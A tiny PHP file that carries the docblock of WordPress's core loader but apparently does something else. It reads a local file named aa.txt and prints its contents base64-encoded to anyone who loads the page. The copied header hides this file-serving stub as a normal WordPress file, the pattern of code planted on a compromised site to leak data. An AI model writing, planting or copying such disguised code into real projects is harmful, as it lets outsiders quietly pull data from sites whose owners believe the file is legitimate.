<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

$str = file_get_contents("./aa.txt", "r") or die("Unable to open file!"); 
echo base64_encode($str);
?>
